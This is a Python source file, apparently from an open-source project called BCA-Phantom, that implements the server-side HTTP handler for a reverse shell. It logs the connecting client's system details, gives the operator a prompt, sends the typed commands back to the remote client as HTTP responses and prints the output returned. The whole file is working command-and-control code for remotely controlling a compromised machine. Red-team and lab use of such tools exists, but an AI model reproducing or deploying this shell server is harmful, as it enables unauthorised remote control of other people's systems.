#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Phantom

__author__ = "EONRaider @ keybase.io/eonraider"

import json
from http.server import BaseHTTPRequestHandler
from urllib.parse import parse_qs


class ShellHandler(BaseHTTPRequestHandler):
    """Handle all HTTP requests received by the ShellServer."""

    def _set_headers(self, response_code: int = 200) -> None:
        self.send_response(response_code)
        self.end_headers()

    def do_GET(self) -> None:
        """Returns a simple JSON status message for the purpose of
        health checking."""
        self.send_header("Content-type", "application/json")
        self._set_headers()
        self.wfile.write(json.dumps({"status": "ok"}).encode())

    def do_POST(self) -> None:
        """Handles POST requests by dispatching the message received
        from each client to their respective methods, depending on the
        contents of the body."""
        length = int(self.headers.get("Content-Length"))
        request_body: dict[str, list[str]] = parse_qs(
            self.rfile.read(length).decode())
        for mode, args in request_body.items():
            try:
                getattr(self, f"_{mode}")(args)
            except AttributeError:
                self._set_headers(404)

    def _open_session(self, session_info: list[str]) -> None:
        """Displays client system information on connection."""
        print("[>] Connection established:")
        info = {"Client address": "{0}:{1}".format(*self.client_address)}
        info |= json.loads(session_info[0])
        for key, value in info.items():
            print("\t[+] {0:.<20} {1}".format(key, value).expandtabs(3))
        print()
        self._set_headers()

    def _prompt(self, shell_info: list[str]) -> None:
        """Builds the shell prompt with basic information received from
        the client, waits for the user's input and sends it back as a
        response."""
        shell = ("\t[{0}:{1}] {2}"
                 .format(*self.client_address, *shell_info)
                 .expandtabs(3))
        try:
            response = input(shell)
        except EOFError:
            raise KeyboardInterrupt
        self._set_headers()
        self.wfile.write(response.encode())

    def _output(self, client_output: list[str]) -> None:
        """Sends the client's output to the user's STDOUT for evaluation
        of results."""
        for output in client_output[0].split("\n"):
            print(f"\t{output}".expandtabs(3))
        self._set_headers()

    def log_message(self, *args, **kwargs):
        """Suppress display of log messages on STDOUT."""
        pass
